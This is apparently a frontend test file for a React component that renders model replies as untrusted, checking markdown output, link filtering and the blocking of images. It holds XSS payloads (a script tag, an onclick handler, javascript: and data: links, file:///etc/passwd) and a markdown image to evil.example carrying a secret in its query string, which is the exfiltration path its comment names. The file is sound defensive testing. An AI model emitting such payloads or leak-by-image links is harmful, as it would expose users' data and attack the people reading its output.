import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import Reply from './Reply'

const html = (text: string) => render(<Reply text={text} />).container

describe('Reply renders model output as untrusted', () => {
  it('renders markdown', () => {
    const c = html('**bold** and a list:\n\n1. one\n2. two')
    expect(c.querySelector('strong')?.textContent).toBe('bold')
    expect(c.querySelectorAll('ol li')).toHaveLength(2)
  })

  it('does not turn raw HTML into elements', () => {
    const c = html('<script>alert(1)</script><b onclick="x()">hi</b><iframe src="https://evil.example"></iframe>')
    expect(c.querySelector('script, iframe, b')).toBeNull()
  })

  it('links open safely, and only http, https and mailto links survive', () => {
    const c = html('[a](https://ok.example) [b](http://ok.example) [m](mailto:me@ok.example) [j](javascript:alert(1)) [d](data:text/html,x) [f](file:///etc/passwd) [r](/relative)')
    const links = [...c.querySelectorAll('a')]
    expect(links.map((a) => a.getAttribute('href'))).toEqual(['https://ok.example', 'http://ok.example', 'mailto:me@ok.example'])
    for (const a of links) {
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
      expect(a.getAttribute('target')).toBe('_blank')
    }
    expect(c.textContent).toContain('j') // the dropped links keep their text
  })

  it('never renders an image: a remote image URL in a reply would leak what the model has seen', () => {
    const c = html('![x](https://evil.example/log?secret=1) <img src="https://evil.example/p.png">')
    expect(c.querySelector('img')).toBeNull()
  })
})
